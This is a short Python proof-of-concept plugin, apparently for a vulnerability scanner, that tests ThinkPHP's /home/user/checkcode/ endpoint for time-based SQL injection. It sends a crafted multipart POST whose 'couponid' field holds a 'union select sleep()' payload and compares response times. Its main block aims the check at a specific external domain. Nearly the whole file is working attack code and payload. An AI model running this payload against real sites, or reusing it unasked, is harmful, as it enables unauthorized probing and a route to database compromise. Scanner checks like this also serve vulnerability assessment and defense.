#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re
import time

def assign(service, arg):
    if service == "thinkphp":
        return True, arg

def audit(arg):
    poc = arg + 'index.php?s=/home/user/checkcode/'
    def make_raw(sleep_time):
        raw = '''POST /index.php?s=/home/user/checkcode/ HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
DNT: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Content-Type: multipart/form-data; boundary=--------641902708
Content-Length: 123

----------641902708
Content-Disposition: form-data; name="couponid"

1') union select sleep('''+str(sleep_time)+''')#
----------641902708--
'''
        return raw
    for i in (1,2):
        code1, head, res, errcode, _ = curl.curl2(poc,raw=make_raw(1))
        timea = time.time()
        code2, head, res, errcode, _ = curl.curl2(poc,raw=make_raw(5))
        timeb = time.time()
        if code1==200 and code2==200 and timeb - timea > 4.5:
            security_hole(poc)
            break
if __name__ == '__main__':
    from dummy import *
    audit(assign('thinkphp', 'http://www.binkanter.com/')[1])